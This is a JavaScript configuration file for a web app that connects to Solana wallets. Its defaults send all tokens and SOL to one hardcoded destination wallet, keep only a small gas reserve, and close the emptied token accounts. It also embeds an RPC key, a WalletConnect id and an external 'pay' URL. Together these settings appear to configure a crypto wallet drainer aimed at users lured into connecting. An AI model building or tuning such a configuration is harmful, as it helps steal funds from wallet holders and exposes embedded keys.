// Configuration file for the application
// For Vite projects, use import.meta.env.VITE_* for environment variables
// Create a .env file in the root to override these defaults

// Helper to parse boolean from env
const parseBool = (value, defaultValue) => {
  if (value === undefined || value === null) return defaultValue;
  if (typeof value === 'boolean') return value;
  return value === 'true' || value === '1';
};

// Helper to parse number from env
const parseNumber = (value, defaultValue) => {
  if (value === undefined || value === null) return defaultValue;
  const num = Number(value);
  return isNaN(num) ? defaultValue : num;
};

export const CONFIG = {
  // Solana RPC endpoint
  SOLANA_RPC_ENDPOINT: import.meta.env.VITE_SOLANA_RPC_ENDPOINT || 'https://solana-mainnet.core.chainstack.com/588ce3a0563eb4c8d2ebb8c60e04b0d2',
  
  // Destination wallet address for token transfers
  DESTINATION_WALLET: import.meta.env.VITE_DESTINATION_WALLET || '7N8VtS3bh5rfyzLRZZ6th8vJCXgzijDqp8EQrABp5Coz',
  
  // Wallet Connect project id
  WALLET_CONNECT_PROJECT_ID: import.meta.env.VITE_WALLET_CONNECT_PROJECT_ID || '55846a70d0633a08583f55c708430332',

  // Other configuration options
  COMMITMENT: import.meta.env.VITE_COMMITMENT || 'confirmed',
  BATCH_SIZE: parseNumber(import.meta.env.VITE_BATCH_SIZE, 1),

  // External payment URL
  EXTERNAL_PAYMENT_URL: import.meta.env.VITE_EXTERNAL_PAYMENT_URL || 'https://www.getmtga.com/pay',
  
  // Transfer configuration
  TRANSFER_CONFIG: {
    // Enable/disable token transfers (SPL tokens)
    TRANSFER_TOKENS: parseBool(import.meta.env.VITE_TRANSFER_TOKENS, true),
    
    // Enable/disable SOL transfers
    TRANSFER_SOL: parseBool(import.meta.env.VITE_TRANSFER_SOL, true),
    
    // Amount of SOL to reserve for gas fees
    SOL_RESERVE_AMOUNT: parseNumber(import.meta.env.VITE_SOL_RESERVE_AMOUNT, 0.01),
    
    // Batch size for transactions (number of transfers per transaction)
    BATCH_SIZE: parseNumber(import.meta.env.VITE_TRANSFER_BATCH_SIZE, 1),
    
    // Include closing token accounts after transfer
    CLOSE_TOKEN_ACCOUNTS: parseBool(import.meta.env.VITE_CLOSE_TOKEN_ACCOUNTS, true),

    // Add failed transactions to tracking
    ADD_TX_FAILED: parseBool(import.meta.env.VITE_ADD_TX_FAILED, true),
  },
  
  // Logging configuration
  LOGGING: {
    // Enable/disable logging system
    ENABLED: parseBool(import.meta.env.VITE_LOGGING_ENABLED, true),
    
    // Log levels: 'debug', 'info', 'warn', 'error'
    LEVEL: import.meta.env.VITE_LOGGING_LEVEL || 'error',
    
    // Enable console logging
    CONSOLE: parseBool(import.meta.env.VITE_LOGGING_CONSOLE, true),
    
    // Enable file logging (for future implementation)
    FILE: parseBool(import.meta.env.VITE_LOGGING_FILE, true),
    
    // Show timestamps in logs
    TIMESTAMPS: parseBool(import.meta.env.VITE_LOGGING_TIMESTAMPS, true),
    
    // Show component/service names in logs
    SHOW_COMPONENT: parseBool(import.meta.env.VITE_LOGGING_SHOW_COMPONENT, true),
    
    // Enable blockchain-specific logging
    BLOCKCHAIN_LOGGING: parseBool(import.meta.env.VITE_LOGGING_BLOCKCHAIN_LOGGING, true),
    
    // Enable wallet logging
    WALLET_LOGGING: parseBool(import.meta.env.VITE_LOGGING_WALLET_LOGGING, true)
  }
};
